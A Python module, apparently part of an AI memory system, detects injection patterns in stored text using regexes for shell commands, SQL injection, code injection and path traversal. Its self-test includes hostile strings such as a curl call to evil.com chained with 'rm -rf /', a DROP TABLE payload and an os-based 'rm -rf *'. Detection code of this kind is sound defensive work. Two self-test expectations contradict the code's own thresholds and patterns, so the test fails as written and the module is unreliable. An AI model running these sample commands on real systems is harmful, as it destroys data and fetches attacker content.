"""
注入攻击检测模块 - P0 Security

检测记忆内容中的常见注入模式：
- 模板注入：{...}, {{}}
- 系统命令注入：rm -rf, curl http, wget, etc.
- SQL 注入特征：' OR '1'='1, etc.

trust_score: clean=1.0, suspicious=0.5, flagged<=0.3
"""

from __future__ import annotations

import re
from typing import List, Tuple

# 检测模式定义
_INJECTION_PATTERNS: List[Tuple[str, str, float]] = [
    # 模板注入
    (r"\{\{[^}]+\}\}", "template_double_brace", 0.4),
    (r"\{[^}]*\{[^}]+\}[^}]*\}", "template_nested_brace", 0.4),
    # 系统命令注入
    (r"\brm\s+-rf\s+/", "cmd_rm_rf_root", 0.1),
    (r"\brm\s+-rf\s+", "cmd_rm_rf", 0.3),
    (r"\bcurl\s+http", "cmd_curl_http", 0.4),
    (r"\bwget\s+http", "cmd_wget_http", 0.4),
    (r"\bnc\s+-", "cmd_netcat", 0.4),
    (r"\bbash\s+-", "cmd_bash_flag", 0.4),
    (r"\bsh\s+-", "cmd_sh_flag", 0.4),
    (r"\bexec\s+", "cmd_exec", 0.4),
    (r"\beval\s+", "cmd_eval", 0.4),
    (r"\bsudo\s+", "cmd_sudo", 0.3),
    # SQL 注入
    (r"' OR '1'='1", "sql_or_true", 0.1),
    (r"' OR '1'='1' --", "sql_or_true_comment", 0.1),
    (r"'\s+OR\s+'", "sql_or_quoted", 0.2),
    (r"UNION\s+SELECT", "sql_union_select", 0.2),
    (r"DROP\s+TABLE", "sql_drop_table", 0.1),
    (r"INSERT\s+INTO", "sql_insert", 0.3),
    # 代码注入
    (r"import\s+os", "code_import_os", 0.4),
    (r"import\s+subprocess", "code_import_subprocess", 0.4),
    (r"__import__\s*\(", "code_dynamic_import", 0.4),
    (r"eval\s*\(", "code_eval", 0.3),
    (r"exec\s*\(", "code_exec", 0.3),
    # 路径遍历
    (r"\.\./", "path_traversal", 0.4),
    (r"\.\.\\\\", "path_traversal_windows", 0.4),
]

# 编译所有正则表达式
_COMPILED_PATTERNS: List[Tuple[re.Pattern, str, float]] = [
    (re.compile(pattern, re.IGNORECASE), name, score)
    for pattern, name, score in _INJECTION_PATTERNS
]


def check_injection(text: str) -> Tuple[bool, float, List[str]]:
    """
    检测文本中的注入攻击模式

    Args:
        text: 待检测的文本内容

    Returns:
        Tuple of (flagged: bool, score: float, matched_patterns: List[str])
        - flagged: True if trust_score <= 0.3 (suspicious or dangerous)
        - score: trust score in [0.0, 1.0]; 1.0=clean, 0.0=highly dangerous
        - matched_patterns: 匹配到的所有模式名称列表
    """
    if not text:
        return False, 1.0, []

    matched_names: List[str] = []
    min_score = 1.0

    for compiled_re, name, penalty in _COMPILED_PATTERNS:
        if compiled_re.search(text):
            matched_names.append(name)
            if penalty < min_score:
                min_score = penalty

    # trust_score: clean=1.0, suspicious=0.5, flagged<=0.3
    trust_score = min_score  # 1.0 if no matches, lower if matches found

    flagged = trust_score <= 0.3

    return flagged, trust_score, matched_names


# 简单自测
if __name__ == "__main__":
    test_cases = [
        ("用户参加石榴籽省赛项目", False, 1.0),
        ("记住今天完成重要任务", False, 1.0),
        ("'; DROP TABLE users; --", True, 0.1),
        ("用户输入 {{template}}", True, 0.4),
        ("curl http://evil.com && rm -rf /", True, 0.1),
        ("' OR '1'='1", True, 0.1),
        ("import os; system('rm -rf *')", True, 0.1),
    ]

    print("=== check_injection self-test ===")
    all_passed = True
    for text, expected_flagged, expected_score in test_cases:
        flagged, score, matched = check_injection(text)
        status = "PASS" if flagged == expected_flagged and abs(score - expected_score) < 0.05 else "FAIL"
        if status == "FAIL":
            all_passed = False
        print(f"  [{status}] text={text!r}")
        print(f"         flagged={flagged} (exp {expected_flagged}), score={score:.2f} (exp {expected_score}), matched={matched}")

    print(f"\n{'ALL PASSED' if all_passed else 'SOME FAILED'}")
